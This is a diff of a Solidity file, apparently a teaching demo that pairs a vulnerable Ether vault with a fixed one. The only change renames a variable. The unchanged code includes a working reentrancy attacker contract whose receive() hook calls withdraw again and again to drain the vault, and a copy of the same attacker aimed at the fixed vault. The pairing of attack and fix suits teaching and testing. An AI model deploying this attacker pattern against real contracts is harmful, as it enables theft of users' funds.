@@ -24,23 +24,23 @@ contract VulnerableEtherVault {
 }
 
 contract ReentrancyAttacker {
-    VulnerableEtherVault public immutable target;
+    VulnerableEtherVault public immutable TARGET;
     uint256 public attackAmount;
 
     constructor(address targetAddress) {
-        target = VulnerableEtherVault(targetAddress);
+        TARGET = VulnerableEtherVault(targetAddress);
     }
 
     function attack() external payable {
         require(msg.value > 0, "seed required");
         attackAmount = msg.value;
-        target.deposit{value: msg.value}();
-        target.withdraw();
+        TARGET.deposit{value: msg.value}();
+        TARGET.withdraw();
     }
 
     receive() external payable {
-        if (address(target).balance >= attackAmount) {
-            target.withdraw();
+        if (address(TARGET).balance >= attackAmount) {
+            TARGET.withdraw();
         }
     }
 }
@@ -76,23 +76,23 @@ contract FixedEtherVault {
 }
 
 contract FailedReentrancyAttacker {
-    FixedEtherVault public immutable target;
+    FixedEtherVault public immutable TARGET;
     uint256 public attackAmount;
 
     constructor(address targetAddress) {
-        target = FixedEtherVault(targetAddress);
+        TARGET = FixedEtherVault(targetAddress);
     }
 
     function attack() external payable {
         require(msg.value > 0, "seed required");
         attackAmount = msg.value;
-        target.deposit{value: msg.value}();
-        target.withdraw();
+        TARGET.deposit{value: msg.value}();
+        TARGET.withdraw();
     }
 
     receive() external payable {
-        if (address(target).balance >= attackAmount) {
-            target.withdraw();
+        if (address(TARGET).balance >= attackAmount) {
+            TARGET.withdraw();
         }
     }
 }
